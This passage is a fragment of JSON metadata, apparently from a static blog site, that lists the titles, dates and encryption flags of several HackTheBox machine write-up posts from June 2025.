Bucket","date":"2025-06-06","isEncrypted":false,"year":"2025","month":"06","day":"06"},{"id":"HackTheBoxMachine -Support","title":"HackTheBox - Machine - Support","date":"2025-06-05","isEncrypted":false,"year":"2025","month":"06","day":"05"},{"id":"HackTheBoxMachine - Hospital","title":"HackTheBox - Machine - Hospital","date":"2025-06-04","isEncrypted":false,"year":"2025","month":"06","day":"04"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Season8 - Certificate","date":"2025-06-02","isEncrypted":true,"year":"2025","month":"06","day":"02"}]},"__N_SSG":true}